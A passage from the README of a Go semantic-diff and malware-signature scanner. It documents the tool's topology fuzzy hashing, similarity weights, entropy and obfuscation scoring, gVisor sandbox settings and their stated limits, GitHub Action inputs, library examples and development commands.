| Reflective call | `reflect.Call`, `reflect.MethodByName` | |

Because the key uses the package name, `crypto/rand.Read` and `math/rand.Read` share the key `rand.Read`. `CallTargets` keeps import paths (`crypto/rand.Read`, `(net/http.Client).Do`), and capabilities are classified from `CallTargets`.

### Fuzzy hash

```
B<⌊log2 blocks⌋>L<min(loops, 5)>BR<0 if no branches, else ⌊log2 branches⌋ + 1>P<params>R<results>
```

`B` is 0 for a function without blocks. Example: 8 blocks, 1 loop, 3 branches, 1 parameter and 1 result give `B3L1BR2P1R1`. `B3` covers 8–15 blocks; `BR3` covers 4–7 branches.

### Similarity

`topology.TopologySimilarity(a, b)` = Σ wᵢ·sᵢ / Σ wᵢ, with Σ wᵢ = 15.5:

| Feature | Weight | Per-feature score sᵢ |
|---------|--------|----------------------|
| Call profile (`CallSignatures`) | 4 | multiset Jaccard: Σ min / Σ max |
| Parameter types | 3 | positional Dice; both empty = 1, one empty = 0 |
| Return types | 2 | same as parameter types |
| Loop count | 2 | 1 if equal, 0.5 if they differ by 1, else 0 |
| Branch count | 1.5 | 1 − \|Δ\| / max |
| Binary-operator profile | 1 | multiset Jaccard |
| Flags: defer, panic, go, select, range | 1 | fraction equal |
| Instruction-type profile | 0.5 | multiset Jaccard |
| Block count | 0.5 | 1 − \|Δ\| / (2·max) |

The scanner does not use this function. It uses `detection.ComputeTopologySimilarity`, described under [scan](#scan).

## Entropy and obfuscation

### Entropy

How `EntropyScore` is computed:

1. Collect every string constant operand of the function's own SSA instructions. Each use counts, so duplicates count twice.
2. Cut each literal to 4096 bytes, then to its longest valid UTF-8 prefix. Skip any literal that would push the function's total past 64 KiB.
3. Sort the literals, concatenate them, and compute the Shannon entropy H = −Σ p(b) log₂ p(b) over byte values.

A function with no string literals scores 0. Literals in a closure belong to the closure.

| Class | Range (bits/byte) |
|-------|-------------------|
| LOW | H < 4.0 |
| NORMAL | 4.0 ≤ H < 6.5 |
| HIGH | 6.5 ≤ H < 7.5 |
| PACKED | H ≥ 7.5 |

Since H ≤ log₂(number of distinct byte values):
- Base64 text (64 symbols) is at most 6.0, so it is never HIGH.
- Printable ASCII (95 symbols) is at most 6.57.
- PACKED needs at least 182 distinct byte values, since 2^7.5 ≈ 181.02. Because invalid UTF-8 is truncated, that requires non-ASCII UTF-8 text.

Binary payloads in `[]byte` composite literals are not string constants; the obfuscation profile measures them instead. The entropy class is used only by [risk scoring](#risk-scoring), not by the scanner.

### Obfuscation profile

`FunctionTopology.Obfuscation` combines six signals into a score in [0, 1].

| Signal | Kind | Normalization | Weight | Applies when |
|--------|------|---------------|--------|--------------|
| Max entropy over 256-byte windows (stride 128) of the constant pool: string bytes and integer constants | dispositive | normCut(H, 5, 8) | 0.30 | pool non-empty |
| Entropy of the non-string constants | dispositive | normCut(H, 4, 8) | 0.20 | numeric pool non-empty |
| Longest run of integer constants in 0..255, ignoring index and slice-bound operands | dispositive | normCut(n, 16, 256) | 0.15 | run > 0 |
| Indirect-call ratio (`dynamic:`, `invoke:`, `reflect` calls) | corroborating | raw | 0.15 | function makes calls |
| Control-flow flattening: concentration of a block's fan-in (needs a block with ≥ 4 predecessors) | corroborating | clamp((maxPred/blocks − 0.25) / 0.5) | 0.10 | ≥ 6 blocks |
| In-loop byte-decoder shape | corroborating | clamp(ops / 4) | 0.10 | ≥ 1 natural loop |

The score is computed in five steps. A signal *fires* when its normalized value is ≥ 0.5.

1. Take the weighted mean over the applicable signals.
2. Raise it to the strongest dispositive value, if that is higher.
3. If a window's entropy is ≥ 7.2, raise it to at least 0.75.
4. If no dispositive signal fired and fewer than two corroborating signals fired, cap it at 0.49.
5. Clamp it to [0, 1].

| Class | Score |
|-------|-------|
| NONE | < 0.25 |
| LOW | 0.25 – < 0.50 |
| MODERATE | 0.50 – < 0.75 |
| HIGH | ≥ 0.75 |

Step 4 keeps a single corroborating signal, such as a higher-order function that only calls function values, below MODERATE. Two corroborating signals are necessary but not sufficient to reach MODERATE.

## Sandbox

`check`, `diff` (single and batch), `deps diff`, `scan` and `audit` re-run `sfw` itself (`internal-worker`) under gVisor `runsc`, which then performs the analysis. `index`, `stats`, `migrate` and library calls are never sandboxed. `--no-sandbox`, or the `SFW_SANDBOX_ID` environment variable, skips it.

The invocation (`internal/sandbox/manager.go`) is:

```
runsc --rootless --ignore-cgroups --network=none --platform=<kvm|ptrace> run --bundle <dir> <id>
```

`kvm` is used when `/dev/kvm` exists, otherwise `ptrace`.

The OCI spec sets:

| Setting | Value |
|---------|-------|
| Root filesystem | read-only |
| Process capabilities | empty bounding and effective sets |
| `NoNewPrivileges` | set |
| `RLIMIT_NOFILE` | 1024 |
| Namespaces | pid, network, ipc, uts, mount, user |
| Resources | memory 512 MiB, CPU shares 1024, pids 64 |
| Environment | `GOPROXY=off`, `GOPATH=/tmp/gopath`, `HOME=/tmp`, `GOCACHE=/tmp/gocache`, `GOMODCACHE=/gomodcache` |
| Read-only mounts | the `sfw` binary, system library directories, `GOROOT`, the host module cache at `/gomodcache`, the working directory, the inputs, each input's `go.mod`/`.git` root and the module root the go command uses (the nearest `go.mod`, past a `.git`), and the governing `go.work`'s directory. A batch mounts each input's root once, and an input itself only when it has no root or is a link out of it; a missing input is an absent side and is not mounted |
| Writable mounts | `/tmp` and `/dev` (tmpfs) |

Limitations:
- **Resource limits are not enforced.** `runsc` runs with `--ignore-cgroups`, so the limits in the spec are not applied as cgroups.
- **No seccomp profile.** The spec sets none.
- **Fail-open.** If `runsc` is not on `PATH`, `sfw` prints `::warning::[Security] 'runsc' not found. Falling back to direct execution.` and runs unsandboxed.

## GitHub Action

```yaml
on: [pull_request]
permissions:
  contents: read
jobs:
  sfw:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4.4.0
        with:
          fetch-depth: 0        # diff, audit and deps read the base commit
      - id: sfw
        uses: BlackVectorOps/semantic_firewall@v7.3.0
        with:
          mode: audit
          api-key: ${{ secrets.ANTHROPIC_API_KEY }}
```

A tag can be moved to another commit; a commit cannot. To run exactly the release you reviewed, pin the Action by the commit its tag names, and keep the version in a comment (`uses: BlackVectorOps/semantic_firewall@<commit> # v7.3.0`). This prints the commit; for an annotated tag it is the line ending in `^{}`:

```bash
git ls-remote https://github.com/BlackVectorOps/semantic_firewall 'refs/tags/v7.3.0*'
```

The Action pins `actions/setup-go` by commit itself.

The Action does the following before running `sfw`:
- installs `sfw` v7.3.0 with `go install`, or uses an `sfw` already on `PATH`;
- installs `runsc` release `20260126.0` and checks its SHA-512;
- relaxes the AppArmor user-namespace restriction for it.

`diff`, `audit` and `deps` compare `HEAD` with a base commit chosen by the event. When the base cannot be resolved the job fails:
- `pull_request` and `pull_request_target`: `HEAD` must contain the pull request's head commit. With GitHub's merge commit checked out (what `actions/checkout` does for `pull_request`), the base is its first parent and nothing is fetched. Otherwise the base branch is fetched by its full ref and the base is its single merge base with `HEAD`, which needs the full history.
- `merge_group`: the group's base commit, and `HEAD` must be the group's head commit.
- `push`: the `before` commit. For a new branch, or a force push whose old commit is gone, it is the merge base of `HEAD` and the default branch.
- any other event: `HEAD~1`.

The base is checked out as a worktree under `RUNNER_TEMP`, outside the checkout, with the Action's other scratch files.

`diff` and `audit` analyze every `.go` file changed between the base and `HEAD` except `_test.go` files, vendored and generated files included, and ignore `path`. git's status says which sides of a change exist, and an absent side is `/dev/null`: an added file is compared with nothing, and a deleted one too, so the checks it made count as removed. A rename stays one pair when both names are `.go` files in scope in the same directory. Otherwise the old name counts as deleted and the new one as added, so moving a file out of the build (to `foo_test.go`, `foo.go.bak`, `testdata/` or another package) reads as removing it. A copy counts as an added file. Text that comes from the change, such as file names and `sfw` or LLM output, is escaped in annotations and printed to the log with workflow commands stopped, so it cannot issue commands of its own. `diff` mode passes every pair to one [`sfw diff --batch`](#batch-mode) run, and fails the job if any file could not be diffed. With `fail-on-alert`, the default, it also fails when `high_risk_changes` summed over the files is above 0, and each high-risk change gets an error annotation on its file (a warning when `fail-on-alert` is `false`).

A pull request runs the workflow as the pull request has it, so it can edit or remove the step that runs the Action. Make the check a required status check, and review changes to `.github/workflows/` with that in mind.

`deps` mode runs [`sfw deps diff`](#sfw-deps-diff) on the base and `HEAD` versions of the module at `path`, which must contain `go.mod` in both. It runs only when a `go.mod`, `go.sum`, `go.work` or `go.work.sum` changed; otherwise `result` is `{}`. It first runs `go mod download` in both trees, each with the workspace that governs it. This fetches and verifies module zips against `go.sum` and runs no code. With `fail-on-alert`, the job fails when `high_risk_changes` is above 0.

| Input | Default | Purpose |
|-------|---------|---------|
| `path` | `.` | target for `check` and `scan`; the module root for `deps` |
| `mode` | `check` | `check`, `diff`, `deps`, `scan` or `audit` |
| `go-version` | `1.27` | passed to `actions/setup-go` |
| `signatures` | — | database path, required for `scan`; `.json` selects the JSON backend |
| `threshold` | `0.75` | scan threshold |
| `strict` | `false` | `check --strict` |
| `fail-on-alert` | `true` | fail a `scan` with `total_alerts > 0`, or `diff` or `deps` with `high_risk_changes > 0`; any value but `true` or `false` fails the job |
| `scan-deps` | `false` | `scan --deps` |
| `deps-depth` | `direct` | `scan --deps-depth` |
| `api-key` | — | exported to the provider's variable according to `model` |
| `model` | `claude-opus-5-5` | `audit --model` |
| `api-base` | — | `audit --api-base` |

The outputs are:
- `result`; in `diff` mode each `old_file` is the path in the repository, not in the base worktree
- `alert-count`
- `deps-scanned`
- `semantic-match-pct`, the mean over changed files
- `audit-verdict`, `PASS` or `FAIL`
- `high-risk-changes`, from `diff` and `deps` modes

## Library usage

Packages live under `pkg/`; `pkg/api` is the entry point the CLI itself calls. Each example below is a complete `main` package.

### Semantic diff

```go
package main

import (
	"fmt"
	"log"

	"github.com/BlackVectorOps/semantic_firewall/v7/pkg/api"
)

func main() {
	out, err := api.Diff("old.go", "new.go")
	if err != nil {
		log.Fatal(err)
	}
	for _, f := range out.Functions {
		fmt.Printf("%-20s %-9s risk=%d %s\n", f.Function, f.Status, f.RiskScore, f.TopologyDelta)
	}
}
```

### Fingerprints and canonical IR

`diff.FingerprintSource(filename, src, policy)` loads the package that contains `filename`, using `src` as an overlay for that file. A relative `filename` is resolved against the working directory. The overlay is type-checked together with every other `.go` file in its directory, and all of their functions are returned. To fingerprint a standalone snippet, give it a directory of its own:

```go
package main

import (
	"fmt"
	"log"
	"os"
	"path/filepath"

	"github.com/BlackVectorOps/semantic_firewall/v7/pkg/analysis/ir"
	"github.com/BlackVectorOps/semantic_firewall/v7/pkg/diff"
)

func main() {
	dir, err := os.MkdirTemp("", "sfw")
	if err != nil {
		log.Fatal(err)
	}
	defer os.RemoveAll(dir)

	src := "package p\n\nfunc Add(a, b int) int { return a + b }\n"
	results, err := diff.FingerprintSource(filepath.Join(dir, "example.go"), src, ir.DefaultLiteralPolicy)
	if err != nil {
		log.Fatal(err)
	}
	for _, r := range results {
		fmt.Printf("%s %s\n%s", r.FunctionName, r.Fingerprint, r.CanonicalIR)
	}
}
```

### Topology and signature scan

```go
package main

import (
	"fmt"
	"log"
	"os"

	"github.com/BlackVectorOps/semantic_firewall/v7/pkg/analysis/ir"
	"github.com/BlackVectorOps/semantic_firewall/v7/pkg/analysis/topology"
	"github.com/BlackVectorOps/semantic_firewall/v7/pkg/diff"
	"github.com/BlackVectorOps/semantic_firewall/v7/pkg/storage/pebbledb"
)

func main() {
	opts := pebbledb.DefaultPebbleScannerOptions()
	opts.ReadOnly = true
	scanner, err := pebbledb.NewPebbleScanner("signatures.db", opts)
	if err != nil {
		log.Fatal(err)
	}
	defer scanner.Close()

	src, err := os.ReadFile("suspect.go")
	if err != nil {
		log.Fatal(err)
	}
	results, err := diff.FingerprintSource("suspect.go", string(src), ir.DefaultLiteralPolicy)
	if err != nil {
		log.Fatal(err)
	}
	for _, r := range results {
		topo := topology.ExtractTopology(r.GetSSAFunction())
		if topo == nil {
			continue
		}
		fmt.Printf("%s calls=%v capabilities=%v fuzzy=%s\n", r.FunctionName, topo.CallTargets, topo.Capabilities, topo.FuzzyHash)
		alerts, err := scanner.ScanTopology(topo, r.FunctionName)
		if err != nil {
			log.Fatal(err)
		}
		for _, a := range alerts {
			fmt.Printf("  [%s] %s confidence=%.2f\n", a.Severity, a.SignatureName, a.Confidence)
		}
	}
}
```

## Development

```bash
CGO_ENABLED=0 go vet ./...
CGO_ENABLED=0 go test ./...
CGO_ENABLED=1 go test -race ./pkg/diff/... ./pkg/api/... ./internal/actiontest/...
```

`.github/workflows/test.yml` runs these on every pull request. `internal/actiontest` runs the Action's shell steps from `action.yml` against fixture repositories, with an `sfw` built from the tree; it needs `jq` and `bc`.

`.github/workflows/govulncheck.yml` fails a pull request whose code reaches a known vulnerability, and runs weekly to catch advisories published after a merge:

```bash
CGO_ENABLED=0 go run golang.org/x/vuln/cmd/govulncheck@v1.8.0 ./...
```

`tools/mutate` is a mutation tester for the lines a branch changed. It applies one fault at a time (an operator flipped, a condition forced, a statement removed) to the Go files changed since a base commit, runs the tests, and lists every mutant no test caught:

```bash
go run ./tools/mutate -base origin/main -pkgs ./pkg/analysis/topology -workers 3
go run ./tools/mutate -base origin/main -list            # mutants per file
```

`-goflags` passes extra `go test` flags to every mutant run (`-goflags "-race -shuffle=on"`; `-race` turns cgo on for the test binary). `-run` limits the tests run per mutant, `-tests` names the packages whose tests judge it (default: the mutated file's package), `-files` limits the files mutated, and `-retest <output>` reruns only the survivors of an earlier run. A surviving mutant is a missing test, or code no test can observe (a cache, a check that cannot fail); each needs one answer or the other.

## License

MIT. See [LICENSE](LICENSE).
